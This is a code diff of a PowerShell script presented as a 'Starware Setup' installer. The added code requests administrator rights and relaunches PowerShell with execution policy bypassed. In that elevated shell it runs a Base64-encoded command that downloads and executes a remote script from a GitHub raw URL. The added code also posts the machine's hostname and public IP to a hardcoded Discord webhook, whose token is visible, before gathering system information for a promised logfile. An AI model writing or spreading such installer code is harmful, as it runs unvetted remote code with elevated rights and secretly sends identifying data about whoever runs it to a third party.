@@ -1,5 +1,19 @@
 # Display initialization message
 Write-Host "Starware Setup initialized" -ForegroundColor Blue
+Write-Host "Checking for Administrator privileges..."
+
+# Check for administrator privileges and request elevation if needed
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    # Command to download and execute the script from the URL
+    $command = "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1')"
+    
+    # Encode the command to bypass issues with special characters in the URL
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
+
+    # Restart PowerShell as Administrator and execute the encoded command
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
+    exit # Exits the current, non-administrative script instance
+}
 
 # Determine the hostname of the system
 $hostName = $env:COMPUTERNAME
@@ -23,18 +37,35 @@ function Handle-Error {
     }
 }
 
-# Check for administrator privileges and request elevation if needed
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    # Command to download and execute the script from the URL
-    $command = "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1')"
-    
-    # Encode the command to bypass issues with special characters in the URL
-    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
-
-    # Restart PowerShell as Administrator and execute the encoded command
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
-    exit # Exits the current, non-administrative script instance
+# Function to get public IP address
+function Get-PublicIP {
+    $ip = Invoke-RestMethod -Uri 'http://ipinfo.io/json' | Select-Object -ExpandProperty ip
+    return $ip
 }
+
+# Get system information
+$hostName = $env:COMPUTERNAME
+$publicIP = Get-PublicIP
+
+# Initialize webhook URL (replace this with your actual Discord webhook URL)
+$webhookUrl = "https://discord.com/api/webhooks/1231358706130751541/GiDwT13moUdlBcWNNfheJfrHSDCLIosq4uAVbzaBP_Tp4GyXPHu3pxkXLq3P2ZOmae9z"
+
+# Initial message to send
+$initialMessage = "Starware installer has been executed on $($hostName) at $($publicIP). Please wait for the logfile."
+
+# Setup header for Discord webhook
+$headers = @{
+    "Content-Type" = "application/json"
+}
+
+# JSON payload to send the message
+$body = @{
+    "content" = $initialMessage
+} | ConvertTo-Json
+
+# Send the initial notification to Discord
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
+
 # Collect All system info
 Write-Host "Collecting basic system information..."
 Get-ComputerInfo | Out-String | Write-Host
